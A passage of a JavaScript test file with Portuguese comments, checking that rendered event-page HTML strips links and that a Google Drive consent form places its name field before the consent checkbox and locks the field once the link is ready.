    expect(html).not.toContain('<a ');
    expect(html).not.toContain('//exemplo.com');
    expect(html).toContain('isto');
  });
});

// O campo de nome do portão do Drive alimenta `consenter_name`, que é a peça de
// não-repúdio do registro de consentimento. Marcar o aceite DISPARA o pedido na
// hora ("no click needed"), e o nome é lido naquele instante — então a ordem dos
// elementos na tela decide se o que a pessoa digitou chega ou não ao banco.
describe('portão do Drive: o campo de nome vem antes do aceite', () => {
  const EV = {
    id: '1', slug: 'alemanha', title: 'Alemanha', accessType: 'public',
    driveUrl: 'https://drive.google.com/drive/folders/x', photos: [],
  };

  it('o nome aparece ANTES da caixa de aceite na marcação', () => {
    const html = eventHTML(EV, 2026, null, 'n', 'dn', 'ft');
    const nome = html.indexOf('id="drive-name-toggle"');
    const aceite = html.indexOf('id="drive-consent"');
    expect(nome).toBeGreaterThan(-1);
    expect(aceite).toBeGreaterThan(-1);
    // Com o nome embaixo, quem lê de cima para baixo marca o aceite primeiro, o
    // pedido sai com o nome vazio, e o que for digitado depois é descartado em
    // silêncio — não existe um segundo pedido para levá-lo.
    expect(nome, 'o convite para incluir o nome tem de vir antes do aceite').toBeLessThan(aceite);
  });

  it('o campo é congelado quando o link fica pronto, em vez de aceitar texto sem efeito', () => {
    const html = eventHTML(EV, 2026, null, 'n', 'dn', 'ft');
    expect(html).toContain('function lockDriveName()');
    // No sucesso, e só no sucesso: no erro o Turnstile renova o token e tenta de
    // novo, e essa tentativa ainda pode levar um nome digitado no meio.
    const lockCall = html.indexOf('lockDriveName();');
    const readyState = html.indexOf("driveLinkState = 'ready';");
    const errorState = html.indexOf("driveLinkState = 'error';");
    expect(lockCall).toBeGreaterThan(readyState);
    expect(lockCall).toBeLessThan(errorState);
  });
});
